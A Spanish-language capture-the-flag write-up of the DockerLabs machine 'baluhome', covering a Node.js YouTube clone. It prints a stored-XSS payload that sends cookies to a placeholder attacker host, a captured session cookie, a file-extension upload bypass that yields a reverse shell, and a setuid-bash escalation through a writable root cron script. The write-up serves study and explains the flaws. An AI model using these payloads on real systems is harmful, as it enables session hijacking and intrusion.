# baluhome — Máquina DockerLabs

![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs.es-orange)
![Dificultad](https://img.shields.io/badge/Dificultad-Media-yellow)
![Tipo](https://img.shields.io/badge/Tipo-Node.js%20%2F%20Linux-blue)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Un clon de YouTube corriendo en Node.js expone un XSS almacenado en su función de subtítulos, que permite robar la sesión del administrador. Desde ahí, una subida de archivo mal validada da RCE, y un script de backup mal configurado en cron entrega root.

## Técnicas Utilizadas

- Enumeración con Nmap
- Cross-Site Scripting (XSS) almacenado
- Robo de cookies / secuestro de sesión
- Explotación de subida de archivos (bypass por extensión)
- Reverse shell específica para Node.js
- Enumeración de archivos de configuración (Dockerfile)
- Escalada de privilegios vía permisos de grupo en cron

## Resumen del Ataque

```text
Nmap --> 3000/tcp (Node.js/Express) --> BaluTube
XSS almacenado en subtítulos --> robo de cookie de sesión
Cookie del admin capturada --> sesión secuestrada
Subida de miniatura .jpg cambiada a .js --> RCE (reverse shell)
Shell www-data --> Dockerfile revela credenciales balutin:123123
su balutin --> grupo "mantenimiento"
backup.sh (ejecutado por root vía cron) escribible por el grupo
Inyección de comando --> chmod u+s /bin/bash --> root
```

## Vulnerabilidad Clave

**XSS Almacenado → Secuestro de Sesión → RCE** — el campo de subtítulos no sanitiza el contenido HTML/JS ingresado por el usuario, permitiendo ejecutar JavaScript arbitrario en el navegador de cualquiera que reproduzca el video, incluyendo al administrador.

```html
<img src=x onerror="new Image().src='http://ATACANTE:4344/C?cookie='+document.cookie">
```

**Escalada de privilegios vía cron mal configurado:**

```text
-rwxrwx--- root mantenimiento backup.sh   # ejecutado por root cada minuto
```

## Análisis de Solicitudes

### Robo de Cookie
```text
GET /C?cookie=balutube.sid=s%3AxT557_hrz-ea1oPpIMQhInmaNs5W_nOi... HTTP/1.1
```

### Bypass de Subida de Archivos
```text
Content-Disposition: form-data; name="thumbnail"; filename="exploit.jpg" --> filename="exploit.js"
```

## Payload de Explotación

**Escalada de privilegios vía script de backup:**
```bash
echo "chmod u+s /bin/bash" >> backup.sh
# esperar al cron (cada minuto)
bash -p
```

## Por Qué Funciona

| Factor | Explicación |
|---|---|
| Sin sanitización de entrada | El contenido de subtítulos se renderiza sin escapar, permitiendo XSS |
| Cookie de sesión desprotegida | Sin flags como `HttpOnly` que impidieran su robo vía JavaScript |
| Validación de subida por extensión | El servidor confía en la extensión del archivo, no en su contenido real |
| Credenciales en Dockerfile | Archivo de construcción expone credenciales del sistema en texto plano |
| Permisos de grupo en script de root | Un script ejecutado por cron como root es escribible por un grupo no privilegiado |

## Referencias

- [revshells.com — Generador de Reverse Shells](https://www.revshells.com/)
- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
